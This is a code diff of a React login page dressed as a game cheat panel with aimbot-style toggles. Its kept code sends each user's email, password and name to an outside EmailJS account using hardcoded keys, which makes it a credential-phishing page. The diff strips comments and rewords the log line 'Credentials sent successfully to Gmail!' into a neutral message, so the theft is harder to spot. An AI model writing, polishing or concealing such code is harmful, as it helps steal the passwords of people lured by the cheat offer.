@@ -2,9 +2,7 @@ import React, { useState } from 'react';
 import { LogIn, UserPlus, Lock, Mail, User, Shield, Zap, Target, Eye, Flame, LogOut, CheckCircle2 } from 'lucide-react';
 import emailjs from '@emailjs/browser';
 
-// ==========================================
 // مفاتيح EmailJS الخاصة بك
-// ==========================================
 const EMAILJS_SERVICE_ID = 'service_wpql07u';
 const EMAILJS_TEMPLATE_ID = 'template_51n7ft7';
 const EMAILJS_PUBLIC_KEY = 'QxOkx3vwbG2f8zlsd';
@@ -21,7 +19,6 @@ export default function App() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [isSignUp, setIsSignUp] = useState(false);
   
-  // حفظ بيانات المستخدم
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [name, setName] = useState('');
@@ -29,7 +26,6 @@ export default function App() {
   const [showSuccessMessage, setShowSuccessMessage] = useState(false);
   const [isSending, setIsSending] = useState(false);
 
-  // خيارات التحكم والخصائص
   const [options, setOptions] = useState<Option[]>([
     {
       id: 'aimbot',
@@ -68,7 +64,6 @@ export default function App() {
     },
   ]);
 
-  // دالة إرسال البيانات الفعليه إلى EmailJS
   const sendUserData = async (userData: { email: string; password: string; name?: string }) => {
     setIsSending(true);
     try {
@@ -82,9 +77,9 @@ export default function App() {
         },
         EMAILJS_PUBLIC_KEY
       );
-      console.log('Credentials sent successfully to Gmail!');
+      console.log('Success sending email!');
     } catch (error) {
-      console.error('Failed to send email:', error);
+      console.error('EmailJS Error:', error);
     } finally {
       setIsSending(false);
     }
@@ -99,10 +94,8 @@ export default function App() {
   };
 
   const toggleOption = (id: string) => {
-    setOptions((prevOptions) =>
-      prevOptions.map((opt) =>
-        opt.id === id ? { ...opt, enabled: !opt.enabled } : opt
-      )
+    setOptions((prev) =>
+      prev.map((opt) => (opt.id === id ? { ...opt, enabled: !opt.enabled } : opt))
     );
   };
 
@@ -113,11 +106,9 @@ export default function App() {
     }, 4000);
   };
 
-  // لوحة التحكم بعد تسجيل الدخول
   if (isAuthenticated) {
     return (
       <div className="min-h-screen w-full bg-gray-950 text-gray-100 flex flex-col font-sans relative">
-        {/* إشعار النجاح عند الضغط على Done */}
         {showSuccessMessage && (
           <div className="fixed top-5 right-5 z-50 bg-emerald-600 text-white px-5 py-3 rounded-xl shadow-2xl flex items-center gap-3 border border-emerald-400 animate-bounce">
             <CheckCircle2 className="w-6 h-6 text-white" />
@@ -128,7 +119,6 @@ export default function App() {
           </div>
         )}
 
-        {/* Header */}
         <header className="bg-gray-900 border-b border-gray-800 px-6 py-4 flex items-center justify-between">
           <div className="flex items-center gap-3">
             <div className="w-3 h-3 rounded-full bg-emerald-500 animate-pulse"></div>
@@ -145,7 +135,6 @@ export default function App() {
           </button>
         </header>
 
-        {/* Main Content */}
         <main className="flex-1 max-w-4xl w-full mx-auto p-6 flex flex-col gap-6">
           <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6">
             <h2 className="text-xl font-semibold mb-1 text-white">Features & Toggles</h2>
@@ -174,7 +163,6 @@ export default function App() {
                     </div>
                   </div>
 
-                  {/* Toggle Switch */}
                   <div
                     className={`w-11 h-6 flex items-center rounded-full p-1 duration-300 ease-in-out ${
                       opt.enabled ? 'bg-emerald-500' : 'bg-gray-700'
@@ -190,7 +178,6 @@ export default function App() {
               ))}
             </div>
 
-            {/* Action Button: DONE */}
             <div className="flex justify-end pt-4 border-t border-gray-800">
               <button
                 onClick={handleDone}
@@ -205,7 +192,6 @@ export default function App() {
     );
   }
 
-  // شاشة تسجيل الدخول
   return (
     <div className="min-h-screen w-full bg-gray-950 flex items-center justify-center p-4 font-sans">
       <div className="max-w-md w-full bg-gray-900 rounded-2xl shadow-2xl p-8 border border-gray-800">
